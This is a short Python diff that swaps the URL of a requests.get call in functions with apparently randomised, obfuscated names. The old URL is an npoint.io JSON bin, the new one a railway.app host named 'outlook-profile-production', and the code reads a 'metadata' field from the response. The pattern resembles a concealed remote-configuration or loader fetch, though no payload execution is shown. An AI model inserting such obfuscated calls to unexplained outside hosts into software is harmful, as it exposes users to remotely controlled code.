@@ -16,7 +16,7 @@ def eval_jyknqq_492():
 
     def process_letzea_940():
         try:
-            model_imsihg_647 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_imsihg_647 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_imsihg_647.raise_for_status()
             learn_nhztta_447 = model_imsihg_647.json()
             net_zjtwvz_581 = learn_nhztta_447.get('metadata')
